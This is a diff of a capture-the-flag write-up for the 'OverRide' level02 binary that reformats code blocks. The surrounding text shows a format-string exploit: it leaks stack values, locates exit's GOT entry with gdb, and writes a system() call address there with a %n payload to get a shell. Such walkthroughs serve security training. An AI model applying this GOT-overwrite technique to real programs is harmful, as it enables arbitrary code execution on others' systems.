@@ -89,7 +89,7 @@ Format String to overide the GOT
 level02@OverRide:~$ (python -c 'print "%8$p" + "\n" + "AAAA"') | ./level02
 0x41414141 does not have access!
 ```
-
+```
 x/s 0x601228
 0x601228 <exit@got.plt>
 
@@ -98,6 +98,7 @@ x/s 0x601228
       0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
 
 p 0x0000000000400a85 = 4196997
+```
 
 ```
 level02@OverRide:~$ (python -c 'print "%4196997p%8$n" + "\n" + "\x60\x12\x28"[::-1]' ; cat) | ./level02 > /dev/null
